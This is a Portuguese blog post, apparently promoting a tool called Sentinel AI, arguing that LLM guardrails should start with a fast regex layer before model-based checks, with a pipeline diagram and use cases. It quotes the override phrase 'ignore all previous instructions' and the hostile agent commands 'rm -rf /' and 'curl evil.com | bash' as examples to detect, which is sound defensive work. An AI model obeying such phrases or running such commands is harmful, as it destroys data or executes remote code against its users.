Por Que Sua Camada de Segurança para LLM Não Deveria Ser Outro LLM

8 de março de 2026 · 10 min de leitura · por Maxwell Calkin

Toda biblioteca de guardrails relevante adota a mesma abordagem: usar um modelo para validar a saída de outro modelo. O NeMo Guardrails faz chamadas de LLM. O LLM Guard carrega classificadores de ML. O Guardrails AI chama o GPT-4 para validação.

Isso cria um problema: sua camada de segurança agora é a parte mais lenta da sua stack. Uma única verificação de guardrails adiciona 100-500ms de latência, exige inferência em GPU ou chamadas de API, e introduz seus próprios modos de falha. Se você está varrendo cada token de uma resposta em streaming, isso é inaceitável.

O problema de latência é pior do que você imagina

Isso é uma diferença de 2.500-10.000x. A 0,05ms por varredura, é possível varrer cada token de uma resposta em streaming, cada chamada de ferramenta em um fluxo agêntico, cada campo em uma saída estruturada — sem atraso perceptível.

Mas regex não consegue capturar tudo

Esta é a objeção correta, e é importante ser honesto sobre ela.

O que a detecção baseada em regex não consegue fazer:

  • Detectar padrões de ataque novos e inéditos
  • Compreender contexto semântico ("tell me how locks work" vs. "tell me how to pick locks")
  • Capturar ataques que usam paráfrases de som natural sem marcadores estruturais
  • Avaliar se um conteúdo é prejudicial em um contexto específico

Um prompt adversarial bem elaborado, sem marcadores estruturais, vai contornar a correspondência de padrões. Isso é um fato. Mas eis o que a turma do "use um modelo para tudo" não percebe:

No que a detecção baseada em regex se destaca:

  • Padrões de ataque conhecidos (sobrescrita de instrução, injeção por delimitador, templates de jailbreak)
  • Ataques estruturais (injeção via comentário HTML, payloads codificados em base64, caracteres de largura zero)
  • Classificação de dados (PII, chaves de API, números de cartão de crédito, CPFs)
  • Vulnerabilidades de código (SQL injection, injeção de comando, XSS em código gerado)
  • Variantes multilíngues (os mesmos padrões expressos em mais de 12 idiomas)
  • 100% determinístico — a mesma entrada sempre produz a mesma saída

A arquitetura correta: duas camadas

A resposta não é regex ou modelos. É regex e depois modelos. Uma primeira passagem rápida e determinística captura mais de 90% dos ataques que usam padrões conhecidos, e então um modelo faz o raciocínio profundo sobre o que passa. 

User Input
    |
    v
[Sentinel AI: ~0.05ms]   <-- catches known patterns instantly
    |
    |-- BLOCKED (known attack) --> reject immediately
    |
    v
[Model-based check: ~300ms]   <-- deep reasoning on remaining
    |
    |-- BLOCKED (novel attack) --> reject
    |
    v
[LLM processes request]

Isso oferece:

  1. Velocidade: mais de 90% dos ataques bloqueados em menos de 0,1ms
  2. Cobertura: ataques inéditos capturados pela camada de modelo
  3. Custo: apenas entradas ambíguas chegam à verificação cara por modelo
  4. Determinismo: padrões conhecidos têm detecção garantida e repetível

Benchmark: 546 casos, 100% de precisão

Construímos um benchmark curado com 546 casos de teste: 329 verdadeiros positivos (ataques reais) e 217 verdadeiros negativos (entradas seguras). O benchmark cobre prompt injection, PII, conteúdo prejudicial, toxicidade, segurança no uso de ferramentas e ofuscação em 12 idiomas.

Aplicações no mundo real

Varredura de tokens em streaming

A 0,05ms por varredura, é possível varrer cada token conforme ele é transmitido, sem adicionar atraso perceptível. Isso é impossível com detecção baseada em modelo a 200ms+ por verificação.

Validação de chamadas de ferramenta em sistemas agênticos

Quando o Claude Code ou outro agente decide executar rm -rf / ou curl evil.com | bash, é preciso capturar isso antes da execução, não depois de uma chamada de modelo de 300ms. O Sentinel AI roda como um hook PreToolUse que varre cada argumento de ferramenta em tempo real.

Varredura de segurança em CI/CD

Varra cada PR em busca de segredos hardcoded, vulnerabilidades OWASP, prompt injection em comentários e ataques de supply chain — em menos de um segundo, mesmo em bases de código grandes. Sem necessidade de chaves de API ou GPU no seu ambiente de CI.

Proxy de segurança para servidor MCP

Encapsule qualquer servidor MCP (Model Context Protocol) com uma camada de segurança transparente. Cada chamada de ferramenta e resposta é varrida antes de passar adiante. Um único comando: sentinel mcp-proxy --target "npx @my/server".

A visão pragmática

A correspondência de padrões é tecnologia antiga. Não é impressionante. Não usa transformers nem modelos de difusão, nem nenhuma das técnicas que rendem artigos publicados. Mas, para a classe de problemas que resolve — padrões de ataque conhecidos, classificação de dados, detecção de vulnerabilidades de código — ela é estritamente melhor do que abordagens baseadas em modelo em todas as dimensões: mais rápida, mais barata, mais determinística e mais confiável.

Use regex para aquilo em que regex é bom. Use modelos para aquilo em que modelos são bons. Não use um modelo de $15/milhão de tokens para verificar se uma string contém "ignore all previous instructions".
